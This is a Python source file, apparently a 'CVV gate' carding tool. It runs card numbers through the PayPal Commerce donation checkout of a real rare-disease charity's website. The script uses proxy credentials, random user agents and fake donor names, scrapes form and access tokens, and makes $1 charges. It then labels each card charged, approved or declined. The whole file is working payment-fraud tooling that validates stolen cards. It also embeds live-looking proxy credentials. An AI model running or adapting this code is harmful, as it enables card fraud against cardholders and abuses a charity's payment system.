import asyncio
import re
import base64
import random
import logging
import json
import aiohttp
from user_agent import generate_user_agent

# Proxy configuration
PROXY_URL = "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080"


def extract_error_code(text: str) -> str:
    """Extracts error code like ORDER_NOT_APPROVED from response text."""
    if not text:
        return None
    
    # Patterns to match PayPal error codes
    patterns = [
        r"'issue':\s*'([^']+)'",
        r'"issue":\s*"([^"]+)"',
        r"'name':\s*'([^']+)'",
        r'"name":\s*"([^"]+)"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).upper()
    
    # Direct string matches
    direct_matches = [
        'DO_NOT_HONOR',
        'ACCOUNT_CLOSED',
        'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
        'LOST_OR_STOLEN',
        'CVV2_FAILURE',
        'INSUFFICIENT_FUNDS',
        'GENERIC_DECLINE',
        'ORDER_NOT_APPROVED',
        'INVALID_CARD',
        'EXPIRED_CARD',
        'PROCESSING_ERROR',
    ]
    
    for code in direct_matches:
        if code in text.upper():
            return code
    
    return None


async def check_gate(card: str) -> dict:
    """
    Checks a card through PayPal Commerce gateway.
    
    Args:
        card: Card in format cc|mm|yy|cvv
    
    Returns:
        dict with keys:
            - status: "charged", "approved", "declined", "error"
            - response: Human readable response message
    """
    try:
        card = card.strip()
        parts = card.split("|")
        if len(parts) < 4:
            return {"status": "error", "response": "Invalid card format"}
       
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if "20" in yy:
            yy = yy.split("20")[1]
       
        target_url = "https://www.rarediseasesinternational.org/donate/"
        base_url = "https://www.rarediseasesinternational.org"
        ajax_url = base_url + "/wp-admin/admin-ajax.php"
       
        user = generate_user_agent()
        amount = "1.00"
       
        first_name = "John"
        last_name = "Doe"
        email = f"john.doe{random.randint(100, 999)}@gmail.com"
       
        headers = {
            'authority': "www.rarediseasesinternational.org",
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': user,
        }
        
        timeout = aiohttp.ClientTimeout(total=60)
        
        # Create connector with proxy
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 1: Get form page and extract tokens
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            async with session.get(target_url, headers=headers, proxy=PROXY_URL) as resp:
                resp_text = await resp.text()
           
            hash_val = re.search(r'name="give-form-hash" value="(.*?)"', resp_text)
            prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp_text)
            form_id = re.search(r'name="give-form-id" value="(.*?)"', resp_text)
            enc_token = re.search(r'"data-client-token":"(.*?)"', resp_text)
           
            if not all([hash_val, prefix, form_id, enc_token]):
                return {"status": "error", "response": "Failed to extract form tokens"}
           
            hash_val = hash_val.group(1)
            prefix = prefix.group(1)
            form_id = form_id.group(1)
            enc_token = enc_token.group(1)
           
            # Decode token to get access token
            decoded = base64.b64decode(enc_token).decode('utf-8')
            access_token_match = re.search(r'"accessToken":"(.*?)"', decoded)
            
            if not access_token_match:
                return {"status": "error", "response": "Failed to extract access token"}
            
            access_token = access_token_match.group(1)
           
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 2: Initial donation post
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            post_headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': base_url,
                'referer': target_url,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': user,
            }
           
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': prefix,
                'give-form-id': form_id,
                'give-form-title': 'Donation',
                'give-current-url': target_url,
                'give-form-url': target_url,
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': hash_val,
                'give-price-id': 'custom',
                'give-amount': amount,
                'payment-mode': 'paypal-commerce',
                'give_first': first_name,
                'give_last': last_name,
                'give_email': email,
                'card_name': f"{first_name} {last_name}",
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
           
            async with session.post(ajax_url, headers=post_headers, data=data, proxy=PROXY_URL) as resp:
                await resp.text()
           
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 3: Create order
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            mp_data = aiohttp.FormData()
            fields = {
                'give-honeypot': '',
                'give-form-id-prefix': prefix,
                'give-form-id': form_id,
                'give-form-title': 'Donation',
                'give-current-url': target_url,
                'give-form-url': target_url,
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': hash_val,
                'give-price-id': 'custom',
                'give-amount': amount,
                'payment-mode': 'paypal-commerce',
                'give_first': first_name,
                'give_last': last_name,
                'give_email': email,
                'card_name': f"{first_name} {last_name}",
                'give-gateway': 'paypal-commerce',
            }
            for key, value in fields.items():
                mp_data.add_field(key, value)
           
            create_headers = {
                'referer': target_url,
                'user-agent': user,
            }
           
            params = {'action': 'give_paypal_commerce_create_order'}
            async with session.post(ajax_url, params=params, headers=create_headers, data=mp_data, proxy=PROXY_URL) as resp:
                order_raw = await resp.text()
                if resp.status >= 500:
                    return {"status": "error", "response": f"Order creation failed: server returned HTTP {resp.status}"}
                try:
                    order_resp = json.loads(order_raw)
                except (json.JSONDecodeError, ValueError):
                    return {"status": "error", "response": f"Order creation failed: non-JSON response (HTTP {resp.status})"}
                if 'data' not in order_resp or not isinstance(order_resp.get('data'), dict) or 'id' not in order_resp['data']:
                    error_msg = order_resp.get('data', {}).get('error', 'Failed to create order') if isinstance(order_resp.get('data'), dict) else 'Failed to create order'
                    return {"status": "error", "response": str(error_msg)}
                order_id = order_resp['data']['id']
           
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 4: Confirm payment source with PayPal
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            pp_headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'authorization': f'Bearer {access_token}',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user,
            }
           
            payload = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }
           
            async with session.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=pp_headers,
                json=payload,
                proxy=PROXY_URL
            ) as resp:
                confirm_text = await resp.text()
           
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # STEP 5: Approve order
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            mp_approve = aiohttp.FormData()
            for key, value in fields.items():
                mp_approve.add_field(key, value)
           
            approve_headers = {
                'origin': base_url,
                'referer': target_url,
                'user-agent': user,
            }
           
            params = {'action': 'give_paypal_commerce_approve_order', 'order': order_id}
            async with session.post(ajax_url, params=params, headers=approve_headers, data=mp_approve, proxy=PROXY_URL) as resp:
                final_text = await resp.text()
            
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            # PARSE FINAL RESPONSE
            # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            combined_response = f"{final_text} {confirm_text}"
            
            # 1. Check for COMPLETED (CHARGED)
            if 'COMPLETED' in combined_response.upper():
                return {"status": "charged", "response": "Thanks, for paying."}
            
            # 2. Check for CVV2_FAILURE (APPROVED status - card is valid but CVV wrong)
            if 'CVV2_FAILURE' in combined_response.upper():
                return {"status": "approved", "response": "CVV Failed"}
            
            # 3. Check for INSUFFICIENT_FUNDS (APPROVED status - card is valid but no funds)
            if 'INSUFFICIENT_FUNDS' in combined_response.upper():
                return {"status": "approved", "response": "Insufficient Funds"}
            
            # 4. Check for specific decline reasons (DECLINED status)
            decline_reasons = {
                'DO_NOT_HONOR': 'Do Not Honor',
                'ACCOUNT_CLOSED': 'Account Closed',
                'PAYER_ACCOUNT_LOCKED_OR_CLOSED': 'Account Closed',
                'LOST_OR_STOLEN': 'Lost or Stolen',
                'GENERIC_DECLINE': 'Generic Decline',
            }
            
            for code, message in decline_reasons.items():
                if code in combined_response.upper():
                    return {"status": "declined", "response": message}
            
            # 5. Try to extract error code from JSON responses
            # First try final_text (approve response)
            try:
                final_json = json.loads(final_text)
                if 'data' in final_json and 'error' in final_json['data']:
                    error_msg = str(final_json['data']['error'])
                    code = extract_error_code(error_msg)
                    return {"status": "declined", "response": code if code else error_msg}
            except (json.JSONDecodeError, TypeError):
                pass
            
            # Then try confirm_text (PayPal API response)
            try:
                confirm_json = json.loads(confirm_text)
                
                # Check for details array with issue codes
                if 'details' in confirm_json and len(confirm_json['details']) > 0:
                    for detail in confirm_json['details']:
                        if 'issue' in detail:
                            issue_code = detail['issue'].upper()
                            # Map specific issues to responses
                            if issue_code == 'ORDER_NOT_APPROVED':
                                return {"status": "declined", "response": "ORDER_NOT_APPROVED"}
                            else:
                                return {"status": "declined", "response": issue_code}
                
                # Check for name field (error name)
                if 'name' in confirm_json:
                    error_name = confirm_json['name'].upper()
                    if error_name == 'UNPROCESSABLE_ENTITY':
                        # Get more specific error from details if available
                        if 'details' in confirm_json:
                            for detail in confirm_json['details']:
                                if 'issue' in detail:
                                    return {"status": "declined", "response": detail['issue'].upper()}
                        return {"status": "declined", "response": error_name}
                    return {"status": "declined", "response": error_name}
                    
            except (json.JSONDecodeError, TypeError):
                pass
            
            # 6. Final fallback - try to extract any error code
            error_code = extract_error_code(combined_response)
            if error_code:
                return {"status": "declined", "response": error_code}
            
            return {"status": "declined", "response": "UNKNOWN_ERROR"}
               
    except asyncio.TimeoutError:
        logging.error("PayPal CVV Gate Error: Request timed out")
        return {"status": "error", "response": "Connection Timed Out"}
    except aiohttp.ClientError as e:
        logging.error(f"PayPal CVV Gate Error: {e}")
        return {"status": "error", "response": "Connection Error"}
    except Exception as e:
        logging.error(f"PayPal CVV Gate Error: {e}")
        return {"status": "error", "response": str(e)}
